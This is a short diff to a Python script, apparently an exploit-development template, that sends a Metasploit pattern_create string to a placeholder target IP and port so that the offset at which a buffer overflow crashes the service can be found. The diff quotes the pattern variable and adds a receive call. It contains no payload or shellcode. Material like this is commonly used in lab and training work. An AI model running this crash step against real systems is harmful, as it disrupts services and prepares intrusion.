@@ -7,7 +7,7 @@ import socket, sys
 target_IP = '[IP]'
 target_port = [port]
 ## Enter in the msf-pattern_create string.
-input_msf_pattern = [msf-patter_create string]
+input_msf_pattern = '[msf-patter_create string]'
 
 # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
 try:
@@ -18,6 +18,7 @@ try:
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target_IP, target_port))
   s.send(input_msf_pattern)
+  s.recv(1024)
   s.close()
     
   # Print confirmation after a full socket creation, data sending, and tear down successfully occurs.
